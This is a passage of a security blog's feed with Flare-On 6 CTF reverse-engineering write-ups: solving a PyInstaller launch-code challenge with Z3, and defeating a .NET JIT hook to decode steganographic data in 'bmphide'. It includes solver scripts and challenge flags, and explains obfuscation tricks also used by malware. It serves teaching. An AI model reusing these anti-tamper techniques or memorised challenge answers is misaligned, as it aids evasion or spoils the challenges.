src="https://blog.attify.com/content/images/2019/09/image-119.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 20: A string reference from builtin_exec_impl</figcaption></figure><p>There&apos;s another tidbit about PyInstaller which we need to be aware about. Every PyInstaller generated executable creates two processes when it runs. The initial parent process spawns a child process which executes the main program. When the child process has exited, the parent process cleans up the extracted files in the Temp directory and then quits. </p><p>Debug the binary in OllyDbg <strong>v2</strong>. We use OllyDby v2 and not x64dbg since the former supports auto debugging child processes out-of-the-box. Ensure that &quot;Debug Child Process&quot; option is checked in Options. Also tick &quot;Pause on new module (DLL)&quot; as shown in Figure 21.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-120.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 21: Setting OllyDbg options</figcaption></figure><p>OllyDbg would automatically open a new instance when the child process is created. Wait for <em>Python37.dll</em> to load in the child process. When it does, search for our string and locate the corresponding piece of code which reference it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-121.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 22: The code which references the string</figcaption></figure><p>From here, go above and set a breakpoint at the start of the function. Continue running till the breakpoint hits and the stack looks like Figure 23.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-122.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 23: The stack contains the passed args</figcaption></figure><p>If we follow the value 1098B0 in dump we can locate our script which we want to patch.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-123.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 24: The script in memory</figcaption></figure><p>From here we can replace any non-essential statement to print out the value of <code>h</code>. Here we change the line <code>t.typewrite(&apos;GREETINGS PROFESSOR FALKEN.\n&apos;)</code> to <code>t.typewrite(&apos;--------------&apos;+str(h)+&apos;---\n&apos;)</code> as in Figure 25.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-124.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 25: Patching the script in memory</figcaption></figure><p>Resuming the process we notice it prints the contents of <code>h</code> on the console.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-125.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 26: The contents of h</figcaption></figure><h3 id="calculating-the-flag">Calculating the flag</h3><p>With the contents of <code>h</code> known, we can leverage the <a href="https://pypi.org/project/z3-solver/">python bindings</a> of <a href="https://github.com/Z3Prover/z3">Z3</a> to solve the equations and get the launch code.</p><pre><code class="language-python">#!/usr/bin/env python2
from z3 import *

h = [115, 29, 32, 68, 106, 108, 89, 76, 21, 71, 78, 51, 75, 1, 55, 102, 2]
x = [BitVec(&apos;x{}&apos;.format(i), 8) for i in range(16)]
s = Solver()

s.add(h[0] == (x[2] ^ x[3] ^ x[4] ^ x[8] ^ x[11] ^ x[14]))
s.add(h[1] == (x[0] ^ x[1] ^ x[8] ^ x[11] ^ x[13] ^ x[14]))
s.add(h[2] == (x[0] ^ x[1] ^ x[2] ^ x[4] ^ x[5] ^ x[8] ^ x[9] ^ x[10] ^ x[13] ^ x[14] ^ x[15]))
s.add(h[3] == (x[5] ^ x[6] ^ x[8] ^ x[9] ^ x[10] ^ x[12] ^ x[15]))
s.add(h[4] == (x[1] ^ x[6] ^ x[7] ^ x[8] ^ x[12] ^ x[13] ^ x[14] ^ x[15]))
s.add(h[5] == (x[0] ^ x[4] ^ x[7] ^ x[8] ^ x[9] ^ x[10] ^ x[12] ^ x[13] ^ x[14] ^ x[15]))
s.add(h[6] == (x[1] ^ x[3] ^ x[7] ^ x[9] ^ x[10] ^ x[11] ^ x[12] ^ x[13] ^ x[15]))
s.add(h[7] == (x[0] ^ x[1] ^ x[2] ^ x[3] ^ x[4] ^ x[8] ^ x[10] ^ x[11] ^ x[14]))
s.add(h[8] == (x[1] ^ x[2] ^ x[3] ^ x[5] ^ x[9] ^ x[10] ^ x[11] ^ x[12]))
s.add(h[9] == (x[6] ^ x[7] ^ x[8] ^ x[10] ^ x[11] ^ x[12] ^ x[15]))
s.add(h[10] == (x[0] ^ x[3] ^ x[4] ^ x[7] ^ x[8] ^ x[10] ^ x[11] ^ x[12] ^ x[13] ^ x[14] ^ x[15]))
s.add(h[11] == (x[0] ^ x[2] ^ x[4] ^ x[6] ^ x[13]))
s.add(h[12] == (x[0] ^ x[3] ^ x[6] ^ x[7] ^ x[10] ^ x[12] ^ x[15]))
s.add(h[13] == (x[2] ^ x[3] ^ x[4] ^ x[5] ^ x[6] ^ x[7] ^ x[11] ^ x[12] ^ x[13] ^ x[14]))
s.add(h[14] == (x[1] ^ x[2] ^ x[3] ^ x[5] ^ x[7] ^ x[11] ^ x[13] ^ x[14] ^ x[15]))
s.add(h[15] == (x[1] ^ x[3] ^ x[5] ^ x[9] ^ x[10] ^ x[11] ^ x[13] ^ x[15]))


if s.check() == sat:
  launch_code = &apos;&apos;
  m = s.model()
  for i in x:
    launch_code += chr(m[i].as_long())

  print launch_code
</code></pre><p>The above script calculates the launch code which comes out to 5C0G7TY2LWI2YXMB. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-126.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 27: Launch code is accepted</figcaption></figure><p>Our calculated launch code is accepted following which it shows the flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-127.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 28: The flag!</figcaption></figure><p>Flag: <a><code>L1n34R_4L93bR4_i5_FuN@flare-on.com</code></a></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 6)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp: bmphide]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part6/</link>
      <guid isPermaLink="false">5d7f736f38c2d600381c998f</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Mon, 14 Oct 2019 18:36:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/09/6.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/09/6.png" alt="Flare-On 6 CTF WriteUp (Part 6)"><p>This is the sixth part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="6-bmphide">6 - bmphide</h2><p>The challenge reads</p><blockquote>Tyler Dean hiked up Mt. Elbert (Colorado&apos;s tallest mountain) at 2am to capture this picture at the perfect time. Never skip leg day. We found this picture and executable on a thumb drive he left at the trail head. Can he be trusted?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/6-1.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 1: Mt. Elbert trail at 2AM!</figcaption></figure><p>We have a .NET executable named <em>bmphide.exe</em> and an associated BMP image which looks like Figure 1. Running the binary, it quits with an <code>IndexOutOfRangeException</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-54.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 2: The binary exits with an exception</figcaption></figure><p>Let us load the binary in dnSpy and check the decompiled code.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-55.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 3: The Main method</figcaption></figure><p>In <code>Main</code> we can see that it accesses <code>args[0]</code>, <code>args[1]</code> and <code>args[2]</code>. The reason for the <code><code>IndexOutOfRangeException</code></code> is because we hadn&apos;t provided any argument. These three arguments are file paths. Among them <code>args[0]</code> and <code>args[2]</code> are path to BMP files with the former being an input file and the latter an output file. We can infer this from the use of the <code>Bitmap</code> on the paths. The other argument viz. <code>args[1]</code> can be any existing file.</p><p>To test our understanding, lets try on a sample bmp shown in Figure 4.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/6-4.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 4: Photo by <a href="https://unsplash.com/@spacex?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">SpaceX</a> on <a href="https://unsplash.com/@spacex?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure><pre><code>D:\&gt; echo ABCDEFGH123456 &gt; test.txt

D:\&gt; dir /b *.txt *.bmp
test.txt
input.bmp

D:\&gt; bmphide.exe input.bmp test.txt output.bmp

D:\&gt; certutil.exe -hashfile input.bmp MD5
MD5 hash of file input.bmp:
ff 51 29 a5 26 01 6c 1f 5c c8 b5 63 8c f1 8a 88
CertUtil: -hashfile command completed successfully.

D:\&gt; certutil.exe -hashfile output.bmp MD5
MD5 hash of file output.bmp:
db 8c 13 1c 33 cf f6 df ad 87 6a 43 d9 f1 d0 41
CertUtil: -hashfile command completed successfully.</code></pre><p><code>output.bmp</code> is visually identical to <code>input.bmp</code> although their md5 hashes differ. This is a typical <a href="https://en.wikipedia.org/wiki/Steganography">steganographic</a> challenge where we need to recover the hidden information encoded in the image. Let&apos;s resume our analysis from where we left.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-56.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 5: The Init method</figcaption></figure><p>From <code>Main</code> we have a call to <code>Init</code> which looks like Figure 5. It loops over all the methods in the Class A while calling <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.runtimehelpers.preparemethod?view=netframework-4.8"><code>RuntimeHelpers.PrepareMethod</code> </a>on each of them. </p><p>The CLR (Common Language Runtime) manages the execution of .NET programs. Unlike typical native executables, .NET binaries doesn&apos;t contain machine code. Instead, they contain a platform independent representation of the instructions (bytecode in Java parlance) known as CIL (Common Intermediate Language) which is understood by the CLR. At runtime the CLR converts the CIL to machine code for the processor it is running on. This process is called JIT (Just In Time). For performance reasons, the CLR does not converts the entire CIL to machine code at one go. Instead it does it on demand as more and more parts of the program are executed for the first time.</p><p>The <code>PrepareMethod</code> function provides a way to force JITing a method before it&apos;s executed. In normal programs calling this method is not necessary and it&apos;s best to leave the decision of JITing on the CLR. However obfuscators, code protectors and malware may rely on this for their work.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-57.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 6: The CalculateStack method</figcaption></figure><p>Next from <code>Init</code> we have a call to <code>CalculateStack</code>. This method identifies the framework version on which it is running by querying the <code><a href="https://docs.microsoft.com/en-us/dotnet/api/system.environment.version?view=netframework-4.8">Environment.Version</a></code> property.</p><p>The <code>IdentifyLocals</code> method does something interesting.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-58.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 7: The IdentifyLocals method</figcaption></figure><p>Based on the framework version its loads a library and obtains the address of an exported function which is then converted to a Delegate. Much of this code has been taken from the open source .NET protector <a href="https://github.com/yck1509/ConfuserEx">ConfuserEx</a>. The above snippet can be found in the <a href="https://github.com/yck1509/ConfuserEx/blob/master/Confuser.Runtime/AntiTamper.JIT.cs#L97"><em>AntiTamperJIT</em></a> class. We can refer to that for better understanding.</p><p>Depending on the version of .NET, it loads <em>clrjit.dll</em> or <em>mscorjit.dll</em> &#xA0;and calls the exported function <code>getJit</code> as shown in Figure 8.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-60.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 8: Calling getJit</figcaption></figure><p><code><a href="https://github.com/dotnet/coreclr/blob/master/src/jit/ee_il_dll.cpp#L206">getJit</a></code> returns a pointer to the <code><a href="https://github.com/dotnet/coreclr/blob/e4134398fd3c91cf3db99972f66fa74d5aa32bcf/src/inc/corjit.h#L224">ICorJitCompiler</a></code> interface as we can see from coreclr source.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-61.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 9: getJit implementation in coreclr</figcaption></figure><p>The returned pointer points to the vtable of the class (<code>CILJit</code> ) implementing the interface. The first member in the vtable is the address of the <code><a href="compileMethod">compileMethod</a></code> function. This function is called by the Execution Engine to convert the IL code of a method to native code.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-62.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 10: The compileMethod function</figcaption></figure><p>Back in <code>IdentifyLocals</code> , it overwrites the vtable entry of <code>compileMethod</code> with the address of <code>IncrementMaxStack</code>. Thus, from now on any call to the former will call the latter instead. The original <code>compileMethod</code> function is saved in <code>originalDelegate</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-63.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 11: Overwriting the vtable entry of compileMethod</figcaption></figure><p> <code>IncrementMaxStack</code> is thus the <code>compileMethod</code> hook.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-66.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 12: IncrementMaxStack method implementing the hook</figcaption></figure><p>The hook will be called by the runtime for every method when JITing. The code above checks whether the <code>MetadataToken</code> of the method to JIT equals 100663317 or 100663316. If so, it proceeds to make some modifications to the IL. Finally, it calls the original <code>compileMethod</code> on the modified(or unmodified) IL. This is a clever way to modify the functionality of a program at run-time. Let&apos;s go ahead and make the necessary changes to the IL of the corresponding methods so we can do away with the hook.</p><h3 id="undoing-the-compilemethod-hook">Undoing the compileMethod hook</h3><p>100663317 (0x06000015) is the token for method <code>Program.h</code> as shown in Figure 13.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-67.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 13: Program.h</figcaption></figure><p>The <code>compileMethod</code> hook writes the value 20 at offsets 23 (0x17) and 62 (0x3e). Let&apos;s check the offsets in the IL editor.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-69.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 14: IL at offset 23 in Program.h</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-70.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 15: IL at offset 62 in Program.h</figcaption></figure><p>Both of the offsets point within a <code>call</code> instruction. The <a href="https://www.ecma-international.org/publications/files/ECMA-ST/ECMA-335.pdf">ECMA-335 specification</a> say this instruction takes a single parameter - the metadata token of the method to call.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-73.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 16: The call instruction described</figcaption></figure><p>Originally it calls <code>Program.f</code> which has a token <code>0x06000013</code>. Writing 20 (0x14) changes the token to <code>0x06000014</code> which is for <code>Program.g</code> (the operands are stored in little endian byte order). Let&apos;s go ahead and change the target of the call to <code>Program.g</code> in the IL editor. Our decompiled code of <code>Program.h</code> now looks like Figure 17.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-74.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 17: Call target changed to Program.g</figcaption></figure><p>The second change done by the hook is in method <code>Program.g</code> with a token of 100663316 (0x06000014).</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-68.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 18: Program.g</figcaption></figure><p>At offsets 6 and 18 (0x12) it writes the <code>Int32</code> value of 309030853 and 209897853 respectively (Figure 12). At both of these offsets we find a <code>ldc.i4</code> instruction.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-76.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 19: IL offsets 6 and 0x12 in Program.g</figcaption></figure><p> As per the ECMA-335 standard this instruction pushes a <code>int32</code> numeric constant onto the stack.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-77.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 20: The ldc.i4 instruction described</figcaption></figure><p>By writing to offsets 6 and 18, the hook is thus modifying the operand of the <code>ldc.i4</code> instruction. In the same way as we did before, we can make the changes in the IL editor to make the decompiled code as in Figure 21.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-78.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 21: The constants in Program.g has been changed</figcaption></figure><h3 id="the-second-trick">The second &quot;trick&quot;</h3><p>Let&apos;s go back to <code>Init</code> from where we started. After the call to <code>CalculateStack</code> (Figure 5) the code loops over all the methods in <code>Program</code>. It obtains the method body as a byte array and calls <code>d.a</code> on it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-79.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 22: Looping over all methods</figcaption></figure><p>The <code>d.a</code> method calculates a hash value of the byte array passed to it as shown in Figure 23.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-80.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 24: The a method calculates the hash</figcaption></figure><p>The returned hash value is then compared to 3472577156, 2689456752, 3040029055, 2663056498. So all in all its searching for 4 methods with the said hashes. Finally it calls <code>VerifySignature</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-81.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 25: Call to VerifySignature</figcaption></figure><p><code>VerifySignature</code> forces the methods to be JIT compiled by calling <code>RuntimeHelpers.PrepareMethod</code>on the method handles.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-82.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 26: Changing the implementation of a method</figcaption></figure><p>The last three lines changes the method pointer of m1 to point to m2. As a result calling m1 from now on will call m2 instead. For details check this <a href="http://iarovyi.com/2017/10/10/last-hope-method-replacer/">blog post</a>.</p><p>At this point we don&apos;t yet know the two methods whose pointer&apos;s are changed. Let&apos;s debug the binary in dnSpy as shown in Figure 27.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-84.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 27: Setting up debugging in dnSpy</figcaption></figure><p>However it immediately crashes with a stack overflow exception.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-83.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 28: Crashed!</figcaption></figure><p>The reason for the exception is because of the <code>compileMethod</code> hook. To debug successfully, we need to remove the hook which can be done by bypassing the call to <code>A.CalculateStack</code> in <code>Init</code>. Set a breakpoint on the line before debugging. When the breakpoint hits, right click on the next line and use &quot;Set Next Statement&quot; to bypass the call.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-85.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 29: Bypassing call to CalculateStack</figcaption></figure><p>We can set another breakpoint on the call to <code>A.VerifySignature</code>. This will help us to find out the arguments passed to the method.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-86.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 30: Breakpoint on VerifySignature</figcaption></figure><p><code>m</code>, <code>m2</code>, <code>m3</code>, <code>m4</code> are methods <code>a</code>, <code>b</code>, <code>c</code> and <code>d</code> respectively. The method pointer of <code>a</code> is replaced with that of <code>b</code>, and <code>c</code> is replaced with <code>d</code>. </p><p>We can make all of the above changes in the same way using the IL editor by changing the call target to <code>b</code> and <code>d</code> whenever we spot a call to <code>a</code> and <code>c</code> respectively. There are the only two places where we need to make the change and both of them are in the method <code>h</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-87.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 31: Calls to a and c</figcaption></figure><p>The calls to <code>a</code> and <code>c</code> are on lines 12 and 15 needs to be changed to <code>b</code> and <code>d</code> respectively. That&apos;s all of the tricks in the binary. Let&apos;s analyze the main logic.</p><h3 id="reversing-the-encoding-logic">Reversing the encoding logic</h3><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-88.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 32: Program.i</figcaption></figure><p>From <code>main</code> we have a call to method <code>i</code> which takes a bitmap and a byte array as parameters. This method encodes the data within the given bitmap hiding the data in the red, green and blue color values of the pixels. The logic is slightly obfuscated with the constants replaced by a call to <code>Program.j</code> &#xA0;which calculates them at runtime. We can easily get back the original constants by debugging the binary. Ensure that the binary is free from the <code>compileMethod</code> hook and all the IL modifications &quot;tricks&quot; are correctly applied.</p><p>Set a breakpoint on the first line in the method <code>Program.i</code> and start debugging with the necessary command line parameters(<em>input.bmp test.txt output.bmp)</em>. Once the breakpoint hits, we can go to the watch window and enter the expressions whose value we want to calculate as in Figure 33.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-90.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 33: Using watch to recover the constants</figcaption></figure><p>Our updated <code>Program.i</code> method now looks like</p><pre><code class="language-C#">public static void encode(Bitmap bm, byte[] data)
{
  int num = 0;
  for (int i = 0; i &lt; bm.Width; i++)
  {
    for (int j = 0; j &lt; bm.Height; j++)
    {
        if (num &gt; data.Length - 1)
        {
            break;
        }
        Color pixel = bm.GetPixel(i, j);
        
        int red = (pixel.R &amp; 248) | (data[num] &amp; 7);
        int green = (pixel.G &amp; 248) | (data[num] &gt;&gt; 3 &amp; 7);
        int blue = (pixel.B &amp; 252) | (data[num] &gt;&gt; 6 &amp; 3);
        
        Color color = Color.FromArgb(0, red, green, blue);
        bm.SetPixel(i, j, color);
        num += 1;
    }
  }
}</code></pre><p>Studying the code, we can understand how it encodes the data in the pixels. It encodes the information in the least significant bits of the RGB values so that it&apos;s not visible to the naked eye. &#xA0;A byte is comprised of 8 bits. The last 3 bits goes into red, next 3 to green and the remaining 2 to blue.</p><p>We have been provided with a bitmap <em>image.bmp</em>. We can recover the encoded data stored in it using the following <a href="https://github.com/oleg-shilo/cs-script">cs-script</a>. </p><pre><code class="language-C#">//decodeimage.cs
using System;
using System.Drawing;
using System.IO;

class decodeimage
{
  public static void Main()
  {
    string image_file = &quot;image.bmp&quot;;
    Bitmap bmp = new Bitmap(image_file);
    
    byte[] ct = new byte[bmp.Width*bmp.Height];
    
    int num = 0;
    for (int i = 0; i &lt; bmp.Width; i++)
    {
      for (int j = 0; j &lt; bmp.Height; j++)
      {
        Color pixel = bmp.GetPixel(i, j);      
        
        byte bits_2_0 = (byte)(pixel.R &amp; 7);
        byte bits_5_3 = (byte)(pixel.G &amp; 7);
        byte bits_7_6 = (byte)(pixel.B &amp; 3);
        
        ct[num] = (byte)((bits_7_6 &lt;&lt;6) | (bits_5_3 &lt;&lt;3)  | bits_2_0);
        num++;
      }
    }
    File.WriteAllBytes(&quot;ct.bin&quot;, ct);
  }
}</code></pre><p>The recovered data doesn&apos;t represent anything meaningful as it&apos;s encrypted as shown in Figure 34.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-91.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 34: The data encoded in the image</figcaption></figure><h3 id="reversing-the-encryption">Reversing the encryption</h3><p>To get back the original data we need to decrypt the recovered data. One way to do that is by studying the encryption logic and try to develop a decrypter. However, we will take a shortcut and bruteforce the original data instead. In other words we will encrypt all possible values that a byte can take (256 values) reusing the logic from the decompiled code. If the encrypted value matches, then our byte is correct.</p><pre><code class="language-C#">//decrypt.cs
using System;
using System.Drawing;
using System.IO;

class decrypt {
  public static byte b(byte b, int r)  {/*snip*/}
  public static byte d(byte b, int r)  {/*snip*/}
  public static byte e(byte b, byte k) {/*snip*/}
  public static byte g(int idx) {/*snip*/}

  public static void Main() {
    byte[] ct = File.ReadAllBytes(&quot;ct.bin&quot;);
    byte[] pt = new byte[ct.Length];
    int num_backup = 0;
    
    for (int i = 0; i &lt; ct.Length; i++) {       
      for(byte xxx = 0; xxx &lt;= 255; xxx++) {
        int num = num_backup;
        int num2 = g(num++);        
        int num3 = xxx;
        num3 = e((byte)num3, (byte)num2);
        num3 = b((byte)num3, 7);
        int num4 = g(num++);
        num3 = e((byte)num3, (byte)num4);
        num3 = d((byte)num3, 3);
      
        if(ct[i] == (byte)num3) {
          pt[i] = xxx;
          num_backup = num;
          break;
        }
      }
    }
    File.WriteAllBytes(&quot;pt.bin&quot;, pt);
  }   
}</code></pre><p>To keep it readable, I have not shown the entire code above. Running our decrypter we get a file with a BMP header which looks like Figure 35.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/6-35.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 35: The encoded data is a BMP!</figcaption></figure><p>Since the encoded data is a bitmap, it&apos;s possible that some data has been hidden inside it as well. In the same way as we did earlier, let&apos;s recover the encoded data in it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/6-36.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 6)" loading="lazy"><figcaption>Figure 36: The flag</figcaption></figure><p>This time we get another BMP containing the flag.</p><p>Flag: <a><code>d0nT_tRu$t_vEr1fy@flare-on.com</code></a></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 5)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : Demo]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part5/</link>
      <guid isPermaLink="false">5d7b479338c2d600381c97ab</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Sun, 13 Oct 2019 18:36:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/09/5-1.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/09/5-1.png" alt="Flare-On 6 CTF WriteUp (Part 5)"><p>This is the fifth part of the Flare-On 6 CTF WriteUp series.</p><h2 id="5-demo">5 - Demo</h2><p>The challenge reads</p><blockquote>Someone on the Flare team tried to impress us with their demoscene skills. It seems blank. See if you can figure it out or maybe we will have to fire them. No pressure.<br>** You will need DirectX 9</blockquote><p>We have a PE file named <em>4k.exe</em>. Running the binary pops up a window containing the rotating Flare logo on a black background.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/5.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 1: Rotating Flare logo</figcaption></figure><p>The window doesn&apos;t exhibit any other behavior. It does not respond to mouse clicks or keypresses except the ESC key which closes it.</p><p>An entropy scan in <a href="https://github.com/horsicq/Detect-It-Easy">Detect It Easy</a> reveals the binary is packed.</p><figure class="kg-card kg-image-card 